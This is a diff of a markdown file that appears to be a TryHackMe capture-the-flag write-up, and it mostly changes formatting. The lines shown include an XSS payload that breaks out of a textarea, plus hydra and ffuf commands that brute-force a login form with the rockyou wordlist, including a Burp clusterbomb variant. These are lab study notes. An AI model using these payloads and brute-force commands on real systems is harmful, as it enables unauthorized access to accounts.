@@ -26,9 +26,8 @@ Register an account
 - We can try XSS:
 (Close off the existing textarea tag first)
 
-```bash
+```js
 </textarea> <script>alert(1)</Script> 
-
 ```
 or use prompt(1) instead
 
@@ -83,15 +82,17 @@ Don't need subdomain in there really (localhost) - still works
 **adminaccount@itsupport.thm**
 
 - Bruteforce the login site:
+
 ```bash
 hydra -l adminaccount@itsupport.thm -P /usr/share/wordlists/rockyou.txt 10.10.41.5 http-post-form "/login:email=adminaccount@itsupport.thm&password=^PASS^:Invalid"
 
 ffuf -w /usr/share/wordlists/rockyou.txt -d "email=adminaccount@itsupport.thm&password=FUZZ" -u http://10.10.190.207/login -fw 475 -H "Content-Type: application/x-www-form-urlencoded"
 
 ```
+
 **<u>Another way:</u>**
 
-Clusterbomb - Save POST request from Burp and edit the parameters
+Clusterbomb - Save POST request from Burp and edit the parameters:
 
 ```bash
 ffuf -request post.txt -request-proto http -mode clusterbomb -w user.txt:UFUZZ -w /usr/share/wordlists/rockyou.txt:PFUZZ -fc 302
